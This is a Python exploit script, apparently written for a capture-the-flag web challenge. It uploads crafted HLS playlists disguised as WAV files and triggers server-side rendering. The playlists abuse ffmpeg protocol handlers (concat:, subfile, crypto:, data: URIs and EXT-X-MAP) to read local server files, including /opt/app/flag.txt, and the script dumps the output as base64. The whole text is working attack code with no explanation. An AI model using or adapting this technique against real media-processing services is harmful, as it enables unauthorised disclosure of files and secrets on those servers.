#!/usr/bin/env python3
import io, json, base64, struct, urllib.request, urllib.error, http.cookiejar, math

BASE="https://d7eef812-5707-splice-c7f97.mystery-challenges.webverselabs-pro.com"
def sess():
    cj=http.cookiejar.CookieJar()
    o=urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj)); o.addheaders=[("User-Agent","Mozilla/5.0")]; return o
def do(o,path,data=None,headers=None,method=None):
    r=urllib.request.Request(BASE+path,data=data,method=method)
    for k,v in (headers or {}).items(): r.add_header(k,v)
    try:
        resp=o.open(r,timeout=120); return resp.status,dict(resp.getheaders()),resp.read()
    except urllib.error.HTTPError as e: return e.code,dict(e.headers),e.read()
    except Exception as e: return -1,{},str(e).encode()
def upload(o,content,fn="clip.wav",ct="audio/wav"):
    bd="----x"; body=io.BytesIO()
    body.write((f"--{bd}\r\nContent-Disposition: form-data; name=\"clip\"; filename=\"{fn}\"\r\nContent-Type: {ct}\r\n\r\n").encode())
    body.write(content); body.write(f"\r\n--{bd}--\r\n".encode())
    return do(o,"/studio/upload",data=body.getvalue(),headers={"Content-Type":f"multipart/form-data; boundary={bd}"},method="POST")
def render(o,**kw):
    st,h,b=do(o,"/api/render",data=json.dumps(kw).encode(),headers={"Content-Type":"application/json"},method="POST")
    try: return json.loads(b)
    except: return b.decode('utf-8','replace')
def realwav(nsamp=2000,freq=300):
    fr=bytes((128+int(100*math.sin(2*math.pi*freq*i/8000)))&0xff for i in range(nsamp))  # u8
    return b"RIFF"+struct.pack("<I",36+len(fr))+b"WAVE"+b"fmt "+struct.pack("<IHHIIHH",16,1,1,8000,8000,1,8)+b"data"+struct.pack("<I",len(fr))+fr
REAL64=base64.b64encode(realwav()).decode()
def m3u8(segment,extra=""):
    return ("#EXTM3U\n#EXT-X-VERSION:3\n#EXT-X-TARGETDURATION:2\n#EXT-X-MEDIA-SEQUENCE:0\n"+extra+"#EXTINF:2.0,\n"+segment+"\n#EXT-X-ENDLIST\n").encode()

o=sess(); do(o,"/studio"); upload(o, realwav()); j=render(o,slug="probe",theme="midnight")
ws=j["outputs"][0]["url"].split("/")[2]; print("WS=",ws)
SELF=f"/opt/app/media/{ws}/source.wav"

def trial(name, seg, extra="", show=False):
    upload(o, m3u8(seg,extra))
    j=render(o,slug="p",theme="midnight")
    ok=j.get("ok") if isinstance(j,dict) else None
    err=(j.get("errors") if isinstance(j,dict) else str(j)) or ""
    print(f"\n#### {name} ok={ok}  seg={seg[:120]}")
    for line in err.splitlines():
        if any(k in line for k in ["hls @","allowed","not in","whitelist","Failed","Error when","Invalid data","Too few","Protocol not","Stream #0:0","Duration:","No such","Unsafe","crypto","subfile","concat"]):
            print("  |",line.strip())
    if ok and show:
        st,h,png=do(o,j["outputs"][0]["url"]); print(f"B64_{name}_START");print(base64.b64encode(png).decode());print(f"B64_{name}_END")

# baseline: data: real wav (ends '=' -> add #x.wav for ext check)
trial("A_data_only", f"data:audio/wav;base64,{REAL64}#x.wav", show=True)
# concat two plain files (no data:), ends .wav
trial("B_concat_files", f"concat:{SELF}|{SELF}")
# concat with file: scheme
trial("C_concat_filescheme", f"concat:file:{SELF}|file:{SELF}")
# subfile of source.wav (ends .wav)
trial("D_subfile_self", f"subfile,,start,0,end,1000,,:{SELF}")
# crypto reading flag (ext .txt -> expect ext error, just to see whitelist)
trial("E_crypto_flag", f"crypto:/opt/app/flag.txt")
# EXT-X-KEY data + concat? just test EXT-X-MAP with data wav then flag segment
trial("F_map_then_flag", "/opt/app/flag.txt", extra=f'#EXT-X-MAP:URI="data:audio/wav;base64,{REAL64}#i.wav"\n')
print("\nDONE")
